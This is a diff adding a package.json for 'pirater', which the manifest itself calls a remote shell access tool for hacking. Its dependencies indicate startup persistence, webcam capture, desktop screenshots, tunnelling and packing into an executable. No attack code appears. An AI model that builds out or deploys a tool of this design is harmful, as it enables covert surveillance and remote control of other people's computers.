@@ -1,0 +1,42 @@
+{
+  "name": "pirater",
+  "version": "1.0.2",
+  "description": "A remote shell access tool for hacking",
+  "main": "./src/index.js",
+  "scripts": {
+    "start": "node .",
+    "local": "node ./src/pirater.js test",
+    "build": "node ./src/compile.js pirater.js",
+    "help": "node ./src/help.js"
+  },
+  "keywords": [
+    "hacking",
+    "remote shell access",
+    "remote control",
+    "reverse shell"
+  ],
+  "license": "GPL",
+  "author": "E",
+  "dependencies": {
+    "auto-launch": "^5.0.5",
+    "axios": "^0.26.1",
+    "chalk": "^4.1.2",
+    "download": "^8.0.0",
+    "express": "^4.18.1",
+    "figlet": "^1.5.2",
+    "localtunnel": "^2.0.2",
+    "node-webcam": "^0.8.0",
+    "open": "^8.4.0",
+    "ora": "^5.4.1",
+    "pm2": "^5.2.0",
+    "prompt-sync": "^4.2.0",
+    "screenshot-desktop": "^1.12.7",
+    "socket.io": "^4.5.0",
+    "socket.io-client": "^4.5.0",
+    "tar": "^6.1.11",
+    "uuid": "^8.3.2"
+  },
+  "devDependencies": {
+    "caxa": "^2.1.0"
+  }
+}
